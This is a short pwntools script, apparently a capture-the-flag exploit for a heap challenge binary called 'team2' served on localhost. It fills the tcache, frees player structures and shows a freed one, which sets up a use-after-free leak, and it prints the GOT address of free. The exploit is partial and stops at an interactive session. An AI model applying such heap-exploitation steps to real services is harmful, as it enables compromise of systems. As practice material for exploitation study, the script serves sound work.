from pwn import *

# r = process("./team2")
r = remote("localhost", 9997)
r.recvuntil("choice:")
elf = ELF("./team2")

def add_player(name="a"):
    r.sendline("1")
    r.sendline(name)
    r.sendline("2")
    r.sendline("2")
    r.sendline("2")
    r.sendline("2")

def delete_player(idx=0):
    r.sendline("2")
    r.sendline(str(idx))

def select_player(idx=0):
    r.sendline("3")
    r.sendline(str(idx))

def show_player(idx=0):
    r.sendline("5")
    r.sendline(str(idx))


print(elf.got['free'])


largename = 'a'*0x80
shortname = 'b'*0x18

# fill tcache, players from 0 to 6
for i in range(4):
    add_player(largename)
for i in range(4):
    delete_player(i)

# now we have only one block in the true bins
# which is the last pstruct created






add_player() #pstruct 1
add_player() #pstruct 2

select_player(7)
delete_player(7)

show_player(3)

r.sendline("6")
r.interactive()
